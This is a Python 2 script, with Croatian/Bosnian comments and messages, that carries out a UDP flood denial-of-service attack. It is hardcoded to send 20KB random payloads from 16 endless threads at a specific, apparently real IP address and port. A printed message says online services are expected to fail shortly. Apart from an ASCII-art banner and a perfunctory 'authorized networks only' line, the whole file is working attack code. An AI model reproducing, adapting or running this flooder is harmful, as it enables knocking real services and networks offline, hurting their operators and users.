# UDP FLOOD SKRIPTA #
# -*- coding: utf-8 -*-
import sys 
import os
import time
import random
import threading
import socket

#Postavke
payload = random._urandom(20000)
# Boje
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

os.system("clear") 

print GREEN + "⠀⠀⠀⠀⠀⢀⣠⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⢀⣴⠿⢫⣯⣍⣉⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⣰⠟⣱⡾⠛⢿⣿⣿⣷⠀⣿⡻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⣸⡏⣼⣿⣿⣷⣤⡉⠻⡿⠀⡟⠿⡎⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⣿⠀⡟⠳⣽⡻⣿⣿⡾⠃⣼⠃⠀⠉⠲⣌⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⢿⡄⠻⣦⣬⣽⡾⠋⣠⡞⠙⢢⠀⠑⢦⡀⣸⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠈⠻⣶⣤⣤⣤⣶⢿⡉⠀⠀⠀⡀⠈⠙⣿⣿⢱⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠉⠛⠷⣌⡓⠯⡳⢄⡀⠈⢳⣴⡿⢻⣿⠄⠀⠈⠻⢦⡄⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠈⠙⠳⢦⠤⠵⢾⣿⣯⣿⣷⡃⠀⠀⠀⠀⠀⠙⢿⣟⠛⣋⣉⣉⣉⣉⣉⡉⠉⠉⢙⡟⠳⢦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢯⣕⢯⠲⣄⠀⠀⠀⠀⠀⠙⢿⣿⠟⠿⠻⠿⠿⢭⡇⠀⢸⠃⣰⣤⣌⡙⠳⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢶⣄⠙⠶⣔⠦⣄⠀⠓⣾⣷⠀⠀⠀⠈⢸⡇⠀⣾⠀⡟⠒⠈⠉⠓⠶⣬⣹⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣷⣦⣈⡓⢈⣓⣶⣿⠋⡄⠀⠀⠀⣿⠀⢀⡇⣠⣇⣀⣀⣀⣀⡐⢺⡇⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠛⣿⣿⣿⡟⠛⠿⠛⠋⢁⣴⣁⣤⠤⠶⠿⠶⠾⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⢾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠶⠶⠶⠛⠛⢻⡿⣿⡿⠷⠿⠛⠛⠛⠛⠛⠛⢩⡟⡁⢠⠖⠀⠀⡀⣠⡶⠻⣷⣄⣈⠉⠛⠻⠿⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⣠⢢⡀⢠⠆⣴⣿⡾⢋⡄⠀⠀⠀⡴⠀⠀⠀⣴⣋⣼⣵⣃⣀⣤⣾⡿⠋⣠⡾⢻⣯⡙⠓⢶⣦⣤⣈⠙⠛⢦⣤⡀⠀⠀⠀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⢠⣾⠥⢾⠷⢿⣾⡿⣿⣿⡟⢁⡞⠀⡤⢀⣞⡇⠀⣠⠚⢻⣤⣮⣤⣤⣽⣽⣽⣷⡾⣿⣶⣿⠿⠿⠿⣿⡷⣤⣍⣻⠶⣦⣈⠙⢷⣤⡀⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⢹⡷⡶⢺⣿⡛⡿⣻⢿⡶⠿⠺⡟⠛⠋⠉⠉⢻⡉⢹⣿⣦⣴⣤⣿⣦⣾⣾⣫⡴⣿⠟⣴⢾⣿⣶⣌⢻⣦⣍⡙⠳⣦⣍⡿⢦⡈⠻⣦⡄"
print "⠀⠀⠀⠀⠀⠀⠀⢿⡗⠻⣿⣻⠻⡛⢻⡌⢻⡄⠀⠓⠀⠘⣦⡄⠀⠓⠈⢿⡘⠈⢯⠻⡼⠈⢿⡈⢷⣿⠀⣿⣿⣉⣿⣿⢈⡿⢿⡿⣿⢿⣿⣿⣦⣙⣷⣼⠇"
print "⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⣹⣥⣷⣧⣄⣿⣾⢿⡄⢷⡀⠀⠸⡾⡄⢠⡸⣌⣿⣤⣬⢦⡿⢤⡼⣿⠟⣿⣆⠹⢿⣿⡿⢋⣼⣇⣸⣿⣬⣻⣿⣿⣿⣿⣧⠛⣦"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡄⣤⡽⡆⡄⢹⣄⢻⣟⣿⣿⣿⣿⢛⣿⣿⣿⣿⣷⡹⢬⡃⢀⢣⠘⣇⠘⣟⢳⣶⣦⠶⣿⣿⣾⣿⣿⣿⣿⣏⣿⣾⣿⣿⠿⣿"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡶⠾⠷⢷⠾⠶⡿⣟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠷⣾⠷⣶⡾⣟⠹⣿⣶⣿⠿⢿⣿⣿⣿⠿⣷⣿⡿⣿⣿⠿⣧⡾⠃"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⢲⡈⢳⡄⠁⠹⣆⡽⠿⠿⢿⡿⢿⠿⢿⠿⢿⣿⣷⣄⣘⠲⡜⠁⠻⣤⡿⠙⠋⢻⡏⠉⠙⣿⠉⠙⣟⠉⢹⣧⣴⠏⠀⠀"
print "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛"+ CYAN + "UDP FLOOD" + GREEN + "⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀"
print " " + RESET
print "Koristi samo na " + RED + "ovlastenim mrezama!" + RESET
print "Napravio  > " + RED + "HunteR_" + RESET

ip = "77.78.204.44"
port = 1508
print " "
pitanje = raw_input("Zelis li nastaviti? " + YELLOW + "[y/n]: " + RESET)
sent = 0
if pitanje.lower() == "y":
    os.system("clear")
    print "Mreza se flooda UDP paketima, ocekivan prestanak rada online servisa u kratkom vremenu."
    print " "
    print YELLOW + "|| IP - 77.78.204.44:1508 (hardcoded)"
    print YELLOW + "|| PAYLOAD - 20KB random generisanih podataka"
    print YELLOW + "|| ISP moze vidjet ovaj promet! " + RESET
    def sender(thread_id):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            try:
                while True:
                    sock.sendto(payload, (ip, port))
            
            finally:
                sock.close()
           
    threads = []

    for i in range(16):
        t = threading.Thread(target=sender, args=(i, ))
        t.daemon = True
        t.start()
        threads.append(t)

    while True:
        time.sleep(0.005)
else:
    print "Prekinut nastavak. Izlazim..."
    exit()
